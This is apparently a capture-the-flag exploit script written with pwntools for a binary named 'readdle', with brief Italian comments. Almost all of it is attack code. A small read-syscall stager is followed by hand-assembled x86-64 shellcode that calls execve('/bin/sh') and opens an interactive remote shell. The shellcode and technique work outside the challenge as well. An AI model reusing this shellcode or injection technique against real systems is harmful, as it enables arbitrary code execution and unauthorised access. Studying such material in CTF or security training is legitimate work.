```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./readdle")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("addr", 10018)

    return r


def main():
    r = conn()
    shellcode = shellcraft.sh()
    r.send(b'\x89\xF2\x0F\x05')#x89\xF2=mov edx,esi. Per aumentare la size. \x0F\x05=syscall. In pratica eseguo una read su stdin
    #Referenzio la stringa /bin/sh aumentano l'indirizzo che la punta della lunghezza dello shellcode.
    shellcode_custom = b"\x90\x90\x90\x90\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC7\x00\x70\x33\x01\x48\x83\xC7\x26\x0F\x05/bin/sh\x00"
    r.send(shellcode_custom)
    r.interactive()


if __name__ == "__main__":
    main()
```
